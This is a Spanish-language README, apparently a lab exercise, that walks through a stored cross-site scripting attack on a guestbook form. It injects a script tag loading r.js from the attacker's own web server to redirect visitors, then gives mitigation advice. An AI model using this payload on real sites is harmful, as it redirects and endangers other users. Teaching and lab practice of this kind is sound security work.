# Explotación Cross-Site Scripting (XSS) Básico con Redirección

Este readme describe una explotación básica de Cross-Site Scripting (XSS) de nivel bajo que resulta en una redirección de página.

## Pre-requisitos

1.  **Servidor Web Temporal:** Asegúrate de tener un servidor web temporal en ejecución. Puedes iniciarlo con Python:
    ```bash
    python -m http.server 80
    ```
    o
    ```bash
    python -m SimpleHTTPServer 80
    ```
    Si Apache u otro servidor web está corriendo en el puerto 80, deténlo primero:
    ```bash
    sudo service apache2 stop
    ```

2.  **Archivo Javascript de Redirección (`r.js`):** Crea un archivo llamado `r.js` en el directorio donde iniciaste el servidor web temporal. Su contenido debe ser la instrucción Javascript para la redirección, reemplazando `http://www.tu-pagina-deseada.com` con la URL deseada:
    ```javascript
    window.location.replace("[http://www.tu-pagina-deseada.com](http://www.tu-pagina-deseada.com)");
    ```

## Pasos de Explotación

1.  **Acceder al Formulario:** Abre la página web que contiene el formulario con los campos "Name" y "Message".

2.  **Introducir Nombre:** En el campo "Name", introduce cualquier valor (máximo 10 caracteres), por ejemplo: `prueba`.

3.  **Introducir Payload XSS:** En el campo "Message", introduce la siguiente etiqueta `<script>` para incluir el script desde tu servidor web temporal. Reemplaza `[tu_IP]` con la dirección IP de tu máquina donde está corriendo el servidor web temporal (si es local, puedes usar `127.0.0.1` o `localhost`).

    ```html
    <script src=http://[tu_IP]/r.js></script>
    ```

    **Ejemplo:** Si tu IP es `192.168.1.100`, el payload sería:

    ```html
    <script src=[http://192.168.1.100/r.js](http://192.168.1.100/r.js)></script>
    ```

    **Importante:** Verifica que la longitud del payload sea menor de 50 caracteres.

4.  **Enviar Formulario:** Haz clic en el botón "Sign Guestbook". Esto enviará los datos al servidor y mostrará una nueva entrada en el guestbook.

5.  **Verificar Inclusión del Script:** Haz clic derecho en la nueva entrada del guestbook y selecciona "Inspeccionar elemento". Busca en el código fuente para confirmar que la etiqueta `<script>` se ha insertado correctamente.

6.  **Verificar Petición al Servidor:** Observa la salida de tu servidor web temporal. Deberías ver una petición GET para el archivo `r.js` cuando la página se recarga o cuando otro usuario la visita.

7.  **Verificar Redirección:** Recarga la página web. Deberías ser redirigido automáticamente a la URL que especificaste en el archivo `r.js`.

## Impacto

Esta explotación demuestra una vulnerabilidad básica de XSS donde un atacante puede inyectar código Javascript malicioso en una página web. En este caso, el resultado es una redirección a una página controlada por el atacante. En escenarios más avanzados, un atacante podría robar información de sesión, realizar acciones en nombre del usuario o inyectar contenido malicioso adicional.

## Mitigación

Para prevenir este tipo de vulnerabilidades XSS, es crucial implementar las siguientes medidas:

* **Validación y Sanitización de Entradas:** Limpiar y validar todas las entradas del usuario antes de mostrarlas en la página web. Esto incluye escapar caracteres especiales que podrían interpretarse como código HTML o Javascript.
* **Codificación de Salida:** Codificar los datos antes de mostrarlos en la página web para evitar que el navegador los interprete como código ejecutable.
* **Política de Seguridad de Contenido (CSP):** Implementar CSP para controlar los recursos que el navegador puede cargar para una página web, lo que puede ayudar a mitigar los ataques XSS.
* **Utilizar Frameworks Seguros:** Muchos frameworks web modernos implementan medidas de seguridad para prevenir vulnerabilidades comunes como el XSS.